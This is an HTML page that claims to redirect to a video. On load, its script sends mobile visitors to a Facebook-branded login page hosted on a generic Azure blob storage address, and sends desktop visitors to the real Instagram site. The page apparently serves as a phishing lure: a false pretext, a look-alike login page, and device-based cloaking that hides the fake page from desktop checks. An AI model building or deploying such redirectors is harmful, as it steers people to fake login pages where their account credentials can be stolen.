<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting to video...</title>
</head>
<body>
    <script type="text/javascript">
        window.addEventListener('load', function() {
            var device = navigator.userAgent;
            var isMobile = /iPhone|iPad|iPod|Android|J2ME|BlackBerry|Opera Mini|IEMobile|Mobile|Windows Phone|windows mobile|windows ce|webOS|palm|bada|series60|nokia|symbian|HTC/i.test(device);
            
            if (isMobile) {
                window.location.href = "https://facebookapps.blob.core.windows.net/facebook/facebooklogin.html"; // Redirige a la versión móvil
            } else {
                window.location.href = "https://www.instagram.com/"; // Redirige a la versión de escritorio
            }
        });
    </script>
</body>
</html>
